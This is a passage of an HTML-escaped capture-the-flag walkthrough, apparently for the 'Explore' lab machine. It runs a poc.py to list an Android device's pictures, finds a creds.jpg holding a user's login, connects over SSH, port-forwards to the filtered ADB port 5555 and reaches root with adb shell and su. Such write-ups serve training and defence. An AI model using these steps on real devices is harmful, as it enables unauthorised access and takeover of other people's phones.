&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.superuser.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;582.00 Bytes (582 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;29.00 KB (29,697 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.environ.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.04 KB (1,064 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.android_x86_64.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;3.36 KB (3,439 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;2.29 MB (2,401,264 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;fstab.android_x86_64&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;753.00 Bytes (753 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;default.prop&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.09 KB (1,118 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;charger&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;12/31/69 07:00:00 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;bugreports&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;12/31/69 07:00:00 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The &lt;code&gt;grep file&lt;/code&gt; is to exclude folders and list only files, since the output also listed folders (&lt;strong&gt;&amp;ldquo;type&amp;rdquo;:&amp;ldquo;folder&amp;rdquo;&lt;/strong&gt;). The reason i wanted to exclude the folders is that when trying to access them, we get an error page saying that directory listing is forbidden:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/2.png&#34; alt=&#34;Pasted image 20210627115906.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We won&amp;rsquo;t be able to list all the files in a directory, so what we want is to look at every file seperately. We can see on the output that the script managed to find a lot of files, however reading them did not give any meaningful information, so the next step was to list pictures:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python poc.py --cmd listPics --host 10.10.10.247                                                                                                                                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Executing command: listPics on 10.10.10.247
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Server responded with: &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;concept.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:38:08 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/concept.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;135.33 KB (138,573 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:37:50 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.24 KB (6,392 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;creds.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:38:18 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/creds.jpg&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.14 MB (1,200,401 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;224_anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;4/21/21 02:37:21 AM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;/storage/emulated/0/DCIM/224_anc.png&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;124.88 KB (127,876 Bytes)&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We immediately see an image named &lt;strong&gt;creds.jpg&lt;/strong&gt; located at &lt;strong&gt;/storage/emulated/0/DCIM/creds.jpg&lt;/strong&gt;. Hitting that path on our browser:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/3.png&#34; alt=&#34;Pasted image 20210627093357.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;we get the credentials of a user named Kristi! This a very common bad practice of phone users, taking pictures of their written down credentials, in order to not forget them, something that can lead to a compromise, as seen here.&lt;/p&gt;
&lt;h1 id=&#34;getting-a-shell-as-kristi&#34;&gt;Getting a shell as Kristi&lt;/h1&gt;
&lt;p&gt;Since we now have valid credentials, using them to login via ssh is the next logical step:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh kristi@10.10.10.247 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt;                                                                                                                                                                                                     &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password authentication
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:/ $ whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;u0_a76
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:/ $
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;and we get a shell on the device.&lt;/p&gt;
&lt;h1 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h1&gt;
&lt;p&gt;After getting a shell on the device, we see that we have limited rights to do pretty much anything. Searching for config files, password files, pictures or any other useful file brought no results. At this point we remember that the nmap scan showed us that the device was listening on port 5555, something that we found out to be a vulnerability that could lead an attacker obtaining root access to the device. At that point we could not do anything about it since it was a filtered port, but now we are inside the device. At first we want to see if the device is indeed listening on this port:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -an &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep LISTEN &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt;                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::5555                 :::*                    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We confirm that the device is listening on port 5555 which means we can again try to connect to it with adb. The problem here though, is that &lt;strong&gt;android-tools-adb&lt;/strong&gt; is not installed on the device. So in order to interact with this port we need to do it from our machine, which has the tools we need installed. Did we not try that before though? The answer is no, because now we have valid ssh credentials and access on the device, which means we can now use port forwarding, in order to connect to port 5555, bypassing any firewall rule that was previously preventing us to do so. To port foward we use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -L 6666:localhost:5555 kristi@10.10.10.247 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; -fN
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Flags explained:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;L&lt;/code&gt;: This specifies that we are going to use a Local Port Forwarding. What we are going to do in this case is make all traffic sent to port &lt;strong&gt;6666&lt;/strong&gt; on our local host to be forwarded to port &lt;strong&gt;5555&lt;/strong&gt; on the target device via the stablished ssh connection.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-fN&lt;/code&gt;: This is a combined switch that does two things: &lt;code&gt;-f&lt;/code&gt; backgrounds the shell immediately so that we have our own terminal back. &lt;code&gt;-N&lt;/code&gt; tells SSH that it doesn&amp;rsquo;t need to execute any commands, only set up the connection.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Of cource since we are going to make an ssh connection as the Kristi user we will get asked for the password we previously got. Hitting enter will background the command and will seem like it did nothing, however the connection was made and is active as we can see below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/4.png&#34; alt=&#34;Pasted image 20210627133307.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;What we have to do now, is repeat the steps we made at the start with &lt;strong&gt;adb&lt;/strong&gt;, however we will now connect on port 6666 on our machine! What is going to happen, is that this connection will be forwarded on port 5555 of the target machine, letting us right in. We start by connecting to port 6666 with &lt;strong&gt;adb&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;adb connect localhost:6666
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/5.png&#34; alt=&#34;Pasted image 20210627132719.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The message states that we are connected, so the next step would be to list our connections to confirm it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;adb devices -l
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/6.png&#34; alt=&#34;Pasted image 20210627132916.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We see that indeed we are connected to localhost:6666 and we get some info about the device we are connected to. We are now able to execute the last step, which is launching a shell on that device. To do this we use:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;adb -s localhost:6666 shell
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/7.png&#34; alt=&#34;Pasted image 20210627132951.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We now have a shell on the device. While the &lt;code&gt;whoami&lt;/code&gt; command shows us that we are not root, the &lt;strong&gt;shell&lt;/strong&gt; user of &lt;strong&gt;adb&lt;/strong&gt; is meant for developers and has more privileges than other users, including the ability to change to the superuser (root). There is a great article to read about the &lt;strong&gt;shell&lt;/strong&gt; user permissions listed on the &lt;strong&gt;Resources&lt;/strong&gt; section at the end of this post:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/8.png&#34; alt=&#34;Pasted image 20210627133103.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploring-ghost-framework&#34;&gt;Exploring Ghost Framework&lt;/h1&gt;
